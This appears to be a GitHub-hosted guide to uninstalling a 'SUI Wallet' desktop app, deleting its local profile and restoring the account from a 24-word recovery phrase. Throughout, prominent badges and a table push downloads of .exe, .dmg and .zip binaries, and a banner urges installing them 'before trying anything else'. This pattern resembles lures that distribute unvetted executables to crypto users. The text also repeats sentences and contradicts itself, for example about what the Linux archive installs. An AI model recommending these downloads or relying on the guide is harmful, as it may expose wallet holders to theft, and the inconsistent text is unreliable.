![SUI Wallet](assets/banner-article.png)

# How to uninstall SUI Wallet completely

Removing the app is not the same as removing the data, and the order matters.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Uninstalling removes the application, and on most systems leaves the small local profile behind; removing
that too is what makes the uninstall complete. Neither step touches the account, because the account is the
24 words. If the phrase is not written down, do that before uninstalling anything.

## What uninstalling does and does not remove

Two separate things live on the machine: the application, which is a program, and its local profile, which holds preferences and derived account data. An uninstaller removes the first and often reports success while leaving the second untouched, so a complete removal is two steps rather than one.

Neither of them holds funds. The balance is on the chain, and the ability to reach it is the phrase on paper.
That is why an uninstall is safe when the phrase exists and dangerous when it does not - not because the
application holds the money, but because it may be the only place the phrase was ever readable.
[Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) is the step that has to come first.

## Before anything is removed

Open the wallet and copy the address somewhere that is not this machine's screen, then check the paper copy of
the phrase against what the app shows when it reveals it. Two facts written down make the rest of this
reversible.

If the phrase cannot be found, stop. An installed application that still opens is a chance to look for it;
an uninstalled one is not.

A second habit costs a minute: take the address and the date down together with the phrase. If the account is ever restored somewhere else and the address differs, that note is what turns an argument into a comparison.

## Windows

Open Settings, go to Apps and then Installed apps, find the wallet and choose uninstall. The uninstaller removes the program and the shortcut, and the local profile survives in the application's data folder, where it waits until somebody deletes it.

Deleting that folder is the second half, and it is the half that matters when the machine is being handed on.
The [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is where the
installer comes from if you later want the application back.

## macOS

Drag the application from Applications to the Bin, then empty it. The disk image you installed from can be ejected and deleted too, since it was never the application. The local profile lives outside the bundle, in the user's library.

The local profile lives outside the application bundle, in the user's library, under the application's name.
Removing that folder completes the job; leaving it costs nothing except that the settings return if the app is
installed again.

## Linux

The archive did not install anything: it unpacked into a folder you chose. Delete that folder, and delete the local profile in the user's home directory if you want the settings gone too, because nothing was registered with the system.

That is why there is no uninstaller on Linux for this build. What was unpacked can be removed by hand, and
nothing was registered with the system in the first place.
Putting it back later means unpacking the archive again, which is the same one-line operation it was the first time.

## The profile is not the account

Removing the profile does not remove the account, and keeping it does not preserve one. The account is derived
from the phrase every time the app starts, so a fresh profile with the same 24 words produces the same address
and the same balance.

Confusing the two is the source of most worry about uninstalling. The thing that cannot be reconstructed is
the paper, not the folder.
[Deleting SUI Wallet data from a shared PC](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/deleting-sui-wallet-data-from-a-shared-pc.md) is the version of this for a machine you do not keep.

The same holds in reverse: a profile that survives an uninstall does not preserve the account either. It holds settings and cached state, and the keys are reconstructed from words each time the app runs.

## Reinstalling afterwards

Install the current release for the platform, open it, and choose the restore route rather than creating a new
account. Enter the 24 words and the address returns with its balance, its objects and any staked position,
because all of that belongs to the account rather than to the installation.

If the address that appears is not the one expected, the phrase is the variable rather than the uninstall.
[Restoring SUI Wallet from a seed phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/restoring-sui-wallet-from-seed-phrase.md) walks the restore screen by screen.

## FAQ

### Does uninstalling delete my funds?

No. The balance is on the chain and is unaffected. What a deletion can cost you is the last readable copy of
the phrase, which is why writing it down comes first.

### How do I remove it completely on Windows?

Uninstall from Installed apps, then delete the application's data folder in the user profile. The second step
is what an uninstaller usually leaves behind.

### Will reinstalling restore my account?

Only with the 24 words. A reinstall starts from an empty profile, and the restore route rebuilds the account
from the phrase.

### Does uninstalling remove the phrase from the machine?

It removes the profile that displayed it, not the paper you wrote. If the phrase was only ever kept on screen,
uninstalling can remove the last copy - so check first.

### Should I uninstall before selling a laptop?

Yes, together with the local profile and a check that no screenshots or notes hold the words. The application
is the easy part; the copies are the part worth hunting.

### Can I keep the wallet installed on two machines?

Yes. The same phrase on both produces the same account, and the chain does not care how many copies of the
keys exist.
